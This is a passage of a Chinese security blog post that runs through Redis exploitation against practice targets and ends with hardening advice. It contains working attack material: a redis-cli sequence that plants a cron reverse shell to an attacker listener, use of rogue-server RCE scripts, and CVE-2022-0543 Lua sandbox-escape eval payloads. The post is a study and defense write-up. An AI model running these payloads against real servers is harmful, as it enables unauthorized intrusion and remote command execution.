<p><strong>注意：</strong><br>在不同系统中，root的位置是不一样的<br>在kali和ubuntu中，其文件位置为&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root，在centos系列中位置为&#x2F;var&#x2F;spool&#x2F;cron&#x2F;root，通常情况下没有root文件，需要自己创建。</p>
<p>攻击机监听端口：</p>
<p><img src="https://img1.plumstar.cn/upload5image-20241016140625516.png" srcset="/img/loading.gif" lazyload></p>
<p>连接redis，写入反弹shell，也可以跟上方一样在console执行，注意kali和centos的定时任务路径不同即可</p>
<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs swift">redis<span class="hljs-operator">-</span>cli.exe <span class="hljs-operator">-</span>h <span class="hljs-number">192.168</span>.<span class="hljs-number">158.141</span><br>config <span class="hljs-keyword">set</span> dir <span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span>crontabs<br><span class="hljs-keyword">set</span> <span class="hljs-operator">-</span><span class="hljs-operator">.-</span> <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>* * * * * bash -i &gt;&amp; /dev/tcp/192.168.158.143/9999 0&gt;&amp;1<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span><br>config <span class="hljs-keyword">set</span> dbfilename root<br>save<br></code></pre></td></tr></table></figure>

<p><img src="https://img1.plumstar.cn/upload5image-20241016170208249.png" srcset="/img/loading.gif" lazyload></p>
<p>过一分钟左右监听就能收到shell了</p>
<p><img src="https://img1.plumstar.cn/upload5image-20241016170547121.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="nmap检测"><a href="#nmap检测" class="headerlink" title="nmap检测"></a>nmap检测</h3><p>如果你的redis-info模块没法用，更新一下nmap可能会有用</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -p <span class="hljs-number">6379</span> --script redis-<span class="hljs-literal">info</span> <span class="hljs-number">192.168.158.143</span><br>地址：https://svn.nmap.org/nmap/scripts/redis-info.nse<br></code></pre></td></tr></table></figure>

<p><img src="https://img1.plumstar.cn/upload5image-20241023182134373.png" srcset="/img/loading.gif" lazyload></p>
<h1 id="redis未授权访问（主从复制）"><a href="#redis未授权访问（主从复制）" class="headerlink" title="redis未授权访问（主从复制）"></a>redis未授权访问（主从复制）</h1><p>本质也是未授权访问，但是因为只存在于4.x、5.x版本中，所以单独写出来</p>
<p>Redis提供了主从模式，主从模式指使用一个redis作为主机，其他的作为备份机，主、从机数据都是一样的，从机只负责读，主机只负责写。在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在Redis中实现一个新的Redis命令，通过写C语言编译并加载恶意的.so文件，达到代码执行的目的。</p>
<p>漏洞编号：<strong>cnvd_2019_21763</strong></p>
<p><strong>原理：</strong></p>
<blockquote>
<p> Redis如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p>
<p> 在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上，然后在从机上加载so文件，我们就可以执行拓展的新命令了。</p>
</blockquote>
<p><strong>条件：</strong></p>
<blockquote>
<p>Redis 版本(4.x~5.0.5)（新增模块功能，可以通过C语言并编译出恶意.so文件）</p>
<p>redis弱密码或者无密码</p>
<p>root启动redis</p>
</blockquote>
<p>原理倒是很简单也很易懂，整个还是建立在redis未授权基础上的漏洞</p>
<h2 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>因为之前服务端我搭建的是2.x版本的，要重新搭建，直接用现成的靶场也可以，我这里就再搭建一个4.x版本的redis，毕竟搭建redis不是那么麻烦的</p>
<p><a target="_blank" rel="noopener" href="https://vulfocus.cn/">https://vulfocus.cn/</a></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> http://download.redis.io/releases/redis-<span class="hljs-number">4</span>.<span class="hljs-number">0</span>.<span class="hljs-number">10</span>.tar.gz<br><span class="hljs-attribute">tar</span> -zxf redis-<span class="hljs-number">4</span>.<span class="hljs-number">0</span>.<span class="hljs-number">10</span>.tar.gz   #解压<br><span class="hljs-attribute">cd</span> redis-<span class="hljs-number">4</span>.<span class="hljs-number">0</span>.<span class="hljs-number">10</span>    #进入解压的文件夹内<br><span class="hljs-attribute">make</span>  <br><span class="hljs-attribute">make</span> install #编译<br></code></pre></td></tr></table></figure>

<p>切换个版本就好，把之前2.x版本的东西覆盖一下，注意这里要将配置文件中的bind参数改为0.0.0.0或者注释掉，并且修改protected-mode为no允许外连</p>
<p><img src="https://img1.plumstar.cn/upload5image-20241023212507905.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://img1.plumstar.cn/upload5image-20241023213647188.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://img1.plumstar.cn/upload5image-20241023212536987.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="漏洞验证-1"><a href="#漏洞验证-1" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>下载漏洞利用工具，也有一个整体的利用项目：<a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
<p>我这里是用了另一个佬的脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/n0b0dyCN/RedisModules-ExecuteCommand<br><span class="hljs-built_in">cd</span> RedisModules-ExecuteCommand/<br>make <span class="hljs-comment"># 生成module.so</span><br></code></pre></td></tr></table></figure>

<p>下载利用脚本并运行</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">git clone https://github.<span class="hljs-keyword">com</span>/Ridter/redis-rce.git<br>pip install -r requirements.txt #安装所需依赖<br><span class="hljs-keyword">python</span> redis-rce.<span class="hljs-keyword">py</span> -r <span class="hljs-number">192.168</span>.<span class="hljs-number">158.143</span> -<span class="hljs-keyword">p</span> <span class="hljs-number">6379</span> -L <span class="hljs-number">192.168</span>.<span class="hljs-number">158.141</span> -<span class="hljs-keyword">f</span> <span class="hljs-built_in">exp</span>.<span class="hljs-keyword">so</span> #这个<span class="hljs-built_in">exp</span>就是上面生成的module.<span class="hljs-keyword">so</span><br></code></pre></td></tr></table></figure>

<p><img src="https://img1.plumstar.cn/upload5image-20241023220951181.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>本质上还是因为未授权访问导致的命令执行漏洞</p>
<h1 id="Redis-Lua沙盒绕过命令执行"><a href="#Redis-Lua沙盒绕过命令执行" class="headerlink" title="Redis Lua沙盒绕过命令执行"></a>Redis Lua沙盒绕过命令执行</h1><p>也是建立在未授权访问的基础上产生的该漏洞</p>
<h2 id="漏洞描述及影响范围"><a href="#漏洞描述及影响范围" class="headerlink" title="漏洞描述及影响范围"></a>漏洞描述及影响范围</h2><p>Redis是著名的开源Key-Value数据库，其具备在沙箱中执行Lua脚本的能力</p>
<p>Debian以及Ubuntu发行版的源在打包Redis时，不慎在Lua沙箱中遗留了一个对象package，攻击者可以利用这个对象提供的方法加载动态链接库liblua里的函数，进而逃逸沙箱执行任意命令；要利用此漏洞，攻击者需具有执行 eval 命令的权限（攻击者经过认证、或者 Redis 本身未设置鉴权检查）</p>
<p>只影响运行在 Debian 系的 Linux 发行版系统（Debian、Ubuntu 等）上的 Redis 服务，其他系统上的 Redis 服务不受影响。</p>
<p>漏洞编号：<strong>CVE-2022-0543</strong></p>
<h2 id="环境搭建-2"><a href="#环境搭建-2" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>通俗点来讲就是借助Lua沙箱中遗留的这个对象提供的方法加载动态链接库liblua里的函数，逃逸沙箱执行任意命令</p>
<p>vulfocus在线靶场、vulhub或者自己搭建redis</p>
<p><a target="_blank" rel="noopener" href="https://vulfocus.cn/">https://vulfocus.cn/</a></p>
<h2 id="漏洞验证-2"><a href="#漏洞验证-2" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-meta">#连接redis</span><br>redis-<span class="hljs-keyword">cli</span> -h ip地址 -p 端口号<br></code></pre></td></tr></table></figure>

<p>我们借助Lua沙箱中遗留的变量<code>package</code>的<code>loadlib</code>函数来加载动态链接库<code>/usr/lib/x86_64-linux-gnu/liblua5.1.so.0</code>里的导出函数<code>luaopen_io</code>。在Lua中执行这个导出函数，即可获得<code>io</code>库，再使用其执行命令：</p>
<p>值得注意的是，不同环境下的liblua库路径不同，你需要指定一个正确的路径。Vulhub环境（Ubuntu fiocal）中，这个路径是<code>/usr/lib/x86_64-linux-gnu/liblua5.1.so.0</code>。</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima">#获取id<br><span class="hljs-built_in">eval</span> &#x27;<span class="hljs-built_in">local</span> io_l = package.loadlib(<span class="hljs-string">&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;</span>, <span class="hljs-string">&quot;luaopen_io&quot;</span>); <span class="hljs-built_in">local</span> io = io_l(); <span class="hljs-built_in">local</span> f = io.popen(<span class="hljs-string">&quot;id&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>); <span class="hljs-built_in">local</span> res = f:<span class="hljs-built_in">read</span>(<span class="hljs-string">&quot;*a&quot;</span>); f:<span class="hljs-built_in">close</span>(); <span class="hljs-built_in">return</span> res&#x27; <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>

<p><img src="https://img1.plumstar.cn/upload5image-20241024004739364.png" srcset="/img/loading.gif" lazyload></p>
<p>这里是在线靶场，直接在对应目录下找flag即可</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima">#执行命令ls /tmp获取flag<br><span class="hljs-built_in">eval</span> &#x27;<span class="hljs-built_in">local</span> io_l = package.loadlib(<span class="hljs-string">&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;</span>, <span class="hljs-string">&quot;luaopen_io&quot;</span>); <span class="hljs-built_in">local</span> io = io_l(); <span class="hljs-built_in">local</span> f = io.popen(<span class="hljs-string">&quot;ls /tmp&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>); <span class="hljs-built_in">local</span> res = f:<span class="hljs-built_in">read</span>(<span class="hljs-string">&quot;*a&quot;</span>); f:<span class="hljs-built_in">close</span>(); <span class="hljs-built_in">return</span> res&#x27; <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>

<p><img src="https://img1.plumstar.cn/upload5image-20241024004906634.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="修复措施"><a href="#修复措施" class="headerlink" title="修复措施"></a>修复措施</h2><p>目前官方已有安全版本，请受影响的用户尽快升级至安全版本进行防护，参考链接：#1005787 - redis: CVE-2022-0543 - Debian Bug report logs。</p>
<p>安全版本：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Debian</span> Redis：<br><span class="hljs-attribute">5</span>:<span class="hljs-number">5</span>.<span class="hljs-number">0</span>.<span class="hljs-number">14</span>-<span class="hljs-number">1</span>+deb10u2<br><span class="hljs-attribute">5</span>:<span class="hljs-number">6</span>.<span class="hljs-number">0</span>.<span class="hljs-number">16</span>-<span class="hljs-number">1</span>+deb11u2<br><span class="hljs-attribute">5</span>:<span class="hljs-number">6</span>.<span class="hljs-number">0</span>.<span class="hljs-number">16</span>-<span class="hljs-number">2</span><br><br><span class="hljs-attribute">Ubuntu</span> Redis：<br><span class="hljs-attribute">5</span>:<span class="hljs-number">6</span>.<span class="hljs-number">0</span>.<span class="hljs-number">15</span>-<span class="hljs-number">1</span>ubuntu0.<span class="hljs-number">1</span><br><span class="hljs-attribute">5</span>:<span class="hljs-number">5</span>.<span class="hljs-number">0</span>.<span class="hljs-number">7</span>-<span class="hljs-number">2</span>ubuntu0.<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<h1 id="Windows下如何getshell"><a href="#Windows下如何getshell" class="headerlink" title="Windows下如何getshell"></a>Windows下如何getshell</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">写入webshell，需要知道web路径<br>写入启动项，需要目标服务器重启<br>写入MOF，MOF每隔5秒钟会自动执行一次，适用于Windows2003。<br></code></pre></td></tr></table></figure>

<h1 id="批量检测未授权redis脚本"><a href="#批量检测未授权redis脚本" class="headerlink" title="批量检测未授权redis脚本"></a>批量检测未授权redis脚本</h1><p><a target="_blank" rel="noopener" href="https://github.com/Ridter/hackredis">https://github.com/Ridter/hackredis</a></p>
<h1 id="修复方式及加固"><a href="#修复方式及加固" class="headerlink" title="修复方式及加固"></a>修复方式及加固</h1><p>1、禁止一些高危命令（重启redis才能生效)</p>
<ul>
<li>修改 redis.conf 文件，禁用远程修改 DB 文件地址</li>
</ul>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">rename</span>-<span class="hljs-keyword">command</span> <span class="hljs-title">FLUSHALL</span> <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-built_in">rename</span>-<span class="hljs-keyword">command</span> <span class="hljs-title">CONFIG</span> <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-built_in">rename</span>-<span class="hljs-keyword">command</span> <span class="hljs-title">EVAL</span> <span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure>

<ul>
<li>或者通过修改redis.conf文件，改变这些高危命令的名称</li>
</ul>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">rename</span>-<span class="hljs-keyword">command</span> <span class="hljs-title">FLUSHALL</span> <span class="hljs-string">&quot;name1&quot;</span><br><br><span class="hljs-built_in">rename</span>-<span class="hljs-keyword">command</span> <span class="hljs-title">CONFIG</span> <span class="hljs-string">&quot;name2&quot;</span><br><br><span class="hljs-built_in">rename</span>-<span class="hljs-keyword">command</span> <span class="hljs-title">EVAL</span> <span class="hljs-string">&quot;name3&quot;</span><br></code></pre></td></tr></table></figure>

<p>2、以低权限运行 Redis 服务（重启redis才能生效）</p>
<p>为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">groupadd -<span class="hljs-attribute">r</span> redis &amp;&amp; useradd -<span class="hljs-attribute">r</span> -<span class="hljs-selector-tag">g</span> redis redis<br></code></pre></td></tr></table></figure>

<p>3、为 Redis 添加密码验证（重启redis才能生效）</p>
<p>修改 redis.conf 文件，添加</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">requirepass mypassword<br>（注意redis不要用-<span class="hljs-selector-tag">a</span>参数，明文输入密码，连接后使用auth认证）<br></code></pre></td></tr></table></figure>

<p>4、禁止外网访问 Redis（重启redis才能生效）</p>
<p>修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">bind</span> <span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure>

<p>在redis3.2之后，redis增加了protected-mode，在这个模式下，非绑定IP或者没有配置密码访问时都会报错。</p>
<p>5、修改默认端口</p>
<p>修改配置文件redis.conf文件</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Port</span> <span class="hljs-number">6379</span><br></code></pre></td></tr></table></figure>

<p>默认端口是6379，可以改变成其他端口（不要冲突就好）</p>
<p>6、保证 authorized_keys 文件的安全</p>
<p>为了保证安全，您应该阻止其他用户添加新的公钥。</p>
<ul>
<li>将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 400 ~/.ssh/authorized_keys<br></code></pre></td></tr></table></figure>

<ul>
<li>为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限:</li>
</ul>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">chattr +i ~<span class="hljs-regexp">/.ssh/</span>authorized_keys<br></code></pre></td></tr></table></figure>

<ul>
<li>然而，用户还可以重命名 ~&#x2F;.ssh，然后新建新的 ~&#x2F;.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置 ~.&#x2F;ssh 的 immutable 权限：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chattr +i ~/.ssh<br></code></pre></td></tr></table></figure>

<p>7、设置防火墙策略</p>
<p>如果正常业务中Redis服务需要被其他服务器来访问，可以设置iptables策略仅允许指定的IP来访问Redis服务。</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E6%95%B4%E7%90%86/" class="category-chain-item">安全问题整理</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/redis/" class="print-no-link">#redis</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>redis系列安全问题整理</div>
      <div>http://example.com/2025/09/04/redis系列漏洞整理/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Winter</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年9月4日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2025/09/04/Nacos%E7%B3%BB%E5%88%97%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E6%95%B4%E7%90%86/" title="Nacos系列安全问题整理">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Nacos系列安全问题整理</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/08/24/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/" title="Java反序列化Shiro篇01-Shiro550流程分析">
                        <span class="hidden-mobile">Java反序列化Shiro篇01-Shiro550流程分析</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
